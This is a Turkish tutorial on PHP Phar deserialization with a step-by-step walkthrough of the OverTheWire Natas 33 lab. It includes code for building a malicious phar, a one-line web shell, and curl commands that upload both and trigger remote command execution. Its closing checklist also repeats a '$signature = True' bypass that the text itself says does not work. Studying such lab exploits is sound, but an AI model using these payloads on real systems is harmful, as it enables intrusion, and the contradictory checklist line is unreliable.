# 🌐 Web Güvenliği — Phar Deserialization

> PHP'de phar:// stream wrapper bir .phar dosyasını açarken
> içindeki serialized metadata'yı otomatik unserialize eder.
> Bu, dosya yükleme + LFI kombinasyonuyla RCE'ye yol açar.

---

## 📋 İçindekiler

- [Phar Nedir?](#phar-nedir)
- [phar:// Stream Wrapper](#phar-stream-wrapper)
- [Phar Metadata Deserialization](#phar-metadata-deserialization)
- [MD5 İmza Bypass](#md5-i̇mza-bypass)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## Phar Nedir?

**Phar (PHP Archive)**, PHP için JAR gibi bir paket formatıdır. Birden fazla PHP dosyasını tek bir `.phar` dosyasında toplar.

```
phar dosyası:
  ├── stub          (PHP kodu — başlangıç)
  ├── manifest      (dosya listesi + metadata)
  ├── contents      (dosya içerikleri)
  └── signature     (bütünlük imzası — MD5/SHA)
```

---

## phar:// Stream Wrapper

PHP'de `phar://` stream wrapper ile phar dosyasının içindeki dosyalara erişilir:

```php
include('phar://archive.phar/file.php');
file_get_contents('phar://archive.phar/data.txt');
```

### Kritik Özellik

`phar://` ile bir dosyaya erişildiğinde, PHP phar manifest'ini okur. Manifest'te **serialized PHP nesneleri** saklanabilir ve bunlar **otomatik olarak unserialize edilir** — `unserialize()` çağrısı olmadan bile!

```
phar:// → manifest'i oku → unserialize(metadata) → __wakeup() / __destruct() tetiklenir
```

Bu, `file_exists()`, `is_file()`, `file_get_contents()`, `include()` gibi **herhangi bir dosya fonksiyonu** tetikleyebilir.

---

## Phar Metadata Deserialization

### Kötü Amaçlı Phar Oluşturma

```php
<?php
class SomeClass {
    public $cmd;
    function __destruct() {
        system($this->cmd);   // tehlikeli magic method
    }
}

// Kötü amaçlı nesne oluştur
$obj = new SomeClass();
$obj->cmd = "cat /etc/natas_webpass/natas34";

// Phar oluştur
$phar = new Phar("evil.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "dummy content");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($obj);    // ← kötü amaçlı nesneyi metadata'ya yaz
$phar->stopBuffering();
?>
```

Bu script çalıştırılınca `evil.phar` oluşur. İçindeki metadata'da `SomeClass` nesnesi serialize edilmiş halde durur.

Sunucuda `phar://evil.phar/test.txt` açıldığında → metadata unserialize → `__destruct()` → komut çalışır.

---

## MD5 İmza Bypass

Natas 33'te phar dosyasının MD5 imzası kontrol ediliyor. Imza PHP'de genellikle şöyle doğrulanır:

```php
// Dosyadan imzayı oku, hesaplanan ile karşılaştır
$signature = md5_file($uploaded_file);
if ($signature !== $expected) {
    die("Invalid signature!");
}
```

Ama Natas 33'teki kontrol **katı** (`===`): `if ($this->signature === md5(file_get_contents($this->filename)))`. Burada `$signature = True` numarası **çalışmaz** — `True === "herhangi_bir_md5"` her zaman **false**'tur (bool ile string tip uyuşmaz), yani type-juggling bypass'ı yok.

Asıl püf nokta: **hem dosyayı hem de phar metadata'sındaki `$signature`'ı SEN kontrol ediyorsun.** Yüklediğin shell'in içeriğinin md5'ini kendin hesaplayıp `$signature`'a yazarsın:

```php
$signature = md5(file_get_contents("shell.php"));   // yüklediğin dosyanın md5'i
```

Böylece `$signature === md5(file_get_contents($filename))` **tam olarak sağlanır** → `include($filename)` çalışır. (Katı karşılaştırmada type-juggling yok; onun yerine imzayı gerçek md5'e eşitliyoruz.)

---

## Natas'ta Kullanım

### Natas 33 — Phar Deserialization + İmza Bypass

**Kaynak kod (özet):**

```php
class Executor {
    private $filename = "default.php";
    private $signature = True;
    private $init = False;

    function __construct() {
        $this->init = True;
    }

    function __destruct() {
        if ($this->init) {
            if (file_exists($this->filename)) {
                if ($this->signature === md5(file_get_contents($this->filename))) {
                    include($this->filename);
                }
            }
        }
    }
}

if(isset($_POST['filename'])) {
    $e = new Executor();
    $e->filename = $_POST['filename'];
    // Dosyayı kaydet
    file_put_contents($uploaded_file, file_get_contents("php://input"));
}
```

**Analiz:**

1. `===` katı karşılaştırma → imzayı geçmek için `$signature`'ı yüklediğin dosyanın md5'ine eşitlersin (aşağıda hesaplanıyor)
2. `__destruct()` → `include($this->filename)` → phar:// ile web shell include et
3. Dosya yükleme var → kötü amaçlı phar yükleyebiliriz

**Exploit Adımları:**

**Adım 1: Web shell hazırla**

```bash
echo '<?php passthru($_GET["cmd"]); ?>' > shell.php
```

**Adım 2: Web shell'i yükle**

```bash
curl -u natas33:[şifre] \
     -X POST \
     --data-binary @shell.php \
     "http://natas33.natas.labs.overthewire.org/index.php?filename=shell.php"
```

**Adım 3: Kötü amaçlı phar oluştur**

```php
<?php
class Executor {
    private $filename = "shell.php";
    // shell.php'nin (yüklediğin dosyanın) içeriğinin md5'i — === kontrolünü geçer:
    private $signature = "SHELL_MD5";   // = md5(file_get_contents("shell.php")); önce hesapla, buraya yaz
    private $init = True;
}

$obj = new Executor();

$phar = new Phar("evil.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($obj);
$phar->stopBuffering();
rename("evil.phar", "evil.jpg");   // jpg olarak yükle
?>
```

```bash
php create_phar.php
```

**Adım 4: Phar dosyasını yükle**

```bash
curl -u natas33:[şifre] \
     -X POST \
     --data-binary @evil.jpg \
     "http://natas33.natas.labs.overthewire.org/index.php?filename=evil.jpg"
```

**Adım 5: phar:// ile tetikle**

```bash
curl -u natas33:[şifre] \
     -X POST \
     -d "filename=phar://evil.jpg/test.txt" \
     "http://natas33.natas.labs.overthewire.org/index.php"
```

`phar://evil.jpg/test.txt` → phar açılır → metadata unserialize → `__destruct()` → `include("shell.php")` → shell çalışır.

**Adım 6: Komutu çalıştır**

```bash
curl -u natas33:[şifre] \
     "http://natas33.natas.labs.overthewire.org/shell.php?cmd=cat+/etc/natas_webpass/natas34"
```

---

### Phar Deserialization — Kontrol Listesi

```
Tespit:
  ☐ Dosya yükleme + dosya işleme var mı?
  ☐ file_exists(), is_file(), include() gibi fonksiyonlar kullanıcı girdisiyle çağrılıyor mu?
  ☐ unserialize() olmasa bile phar:// tetikleyebilir

Exploit:
  ☐ Hedef sınıfın __destruct veya __wakeup'ını bul
  ☐ Kötü amaçlı nesneyi metadata'ya göm → Phar oluştur
  ☐ Phar dosyasını farklı uzantıyla yükle (.jpg, .png)
  ☐ phar:// stream wrapper ile tetikle
  ☐ $signature = True varsa imza kontrolü bypass

PHP Phar oluşturmak için:
  ☐ php.ini'de phar.readonly = Off olmalı
  ☐ php create_phar.php ile oluştur
```

---

## 🔗 Kaynaklar

- [PortSwigger — Phar Deserialization](https://portswigger.net/web-security/deserialization/exploiting)
- [Secarma — File Upload to RCE via Phar](https://secarma.com/using-phar-archives-to-bypass-file-type-restrictions/)
- [PHP — Phar Stream Wrapper](https://www.php.net/manual/en/phar.using.intro.php)
- [BlackHat 2018 — Phar Deserialization](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)

---

**Önceki konu:** [23_log_poisoning.md](./23_log_poisoning.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
